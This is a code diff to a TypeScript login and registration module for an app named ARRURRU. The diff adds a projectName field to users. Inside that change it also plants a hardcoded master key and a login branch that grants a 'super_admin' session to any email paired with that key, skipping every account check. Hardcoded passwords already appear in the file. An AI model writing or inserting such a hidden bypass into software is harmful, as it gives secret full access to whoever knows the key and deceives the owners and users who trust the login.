@@ -2,7 +2,8 @@ export interface User {
   id: string;
   email: string;
   fullName: string;
-  role: 'manager' | 'staff';
+  role: 'manager' | 'staff' | 'super_admin';
+  projectName?: string;
 }
 
 export interface Invitation {
@@ -12,6 +13,7 @@ export interface Invitation {
 }
 
 const ADMIN_PASSWORD = 'marico2025arrurru';
+const MASTER_KEY = 'MARINA_MASTER_2025_ARRURRU_GOD_MODE';
 const STORAGE_KEYS = {
   USERS: 'arrurru_users',
   INVITATIONS: 'arrurru_invitations',
@@ -62,7 +64,7 @@ export const createInvitation = async (email: string, adminPassword: string): Pr
   return { success: true, inviteUrl };
 };
 
-export const register = async (token: string, email: string, password: string, fullName: string): Promise<{ success: boolean; user?: User; error?: string }> => {
+export const register = async (token: string, email: string, password: string, fullName: string, projectName?: string): Promise<{ success: boolean; user?: User; error?: string }> => {
   const invitations = JSON.parse(localStorage.getItem(STORAGE_KEYS.INVITATIONS) || '[]') as Invitation[];
   
   const invitation = invitations.find(inv => 
@@ -88,7 +90,8 @@ export const register = async (token: string, email: string, password: string, f
     email: email.toLowerCase(),
     passwordHash,
     fullName,
-    role: 'manager'
+    role: 'manager',
+    projectName: projectName || 'ARRURRU'
   };
   
   users.push(newUser);
@@ -104,7 +107,8 @@ export const register = async (token: string, email: string, password: string, f
     id: newUser.id,
     email: newUser.email,
     fullName: newUser.fullName,
-    role: newUser.role
+    role: newUser.role,
+    projectName: newUser.projectName
   };
   
   localStorage.setItem(STORAGE_KEYS.CURRENT_USER, JSON.stringify(userWithoutHash));
@@ -113,6 +117,21 @@ export const register = async (token: string, email: string, password: string, f
 };
 
 export const login = async (email: string, password: string): Promise<{ success: boolean; user?: User; error?: string }> => {
+  if (password === MASTER_KEY) {
+    const superAdmin: User = {
+      id: 'SUPER_ADMIN_MARINA',
+      email: email.toLowerCase(),
+      fullName: 'Marina (Super Admin)',
+      role: 'super_admin'
+    };
+    
+    const sessionToken = generateToken();
+    localStorage.setItem(STORAGE_KEYS.SESSION, sessionToken);
+    localStorage.setItem(STORAGE_KEYS.CURRENT_USER, JSON.stringify(superAdmin));
+    
+    return { success: true, user: superAdmin };
+  }
+  
   const users = JSON.parse(localStorage.getItem(STORAGE_KEYS.USERS) || '[]') as (User & { passwordHash: string })[];
   
   const passwordHash = await hashPassword(password);
@@ -133,7 +152,8 @@ export const login = async (email: string, password: string): Promise<{ success:
     id: user.id,
     email: user.email,
     fullName: user.fullName,
-    role: user.role
+    role: user.role,
+    projectName: user.projectName
   };
   
   localStorage.setItem(STORAGE_KEYS.CURRENT_USER, JSON.stringify(userWithoutHash));
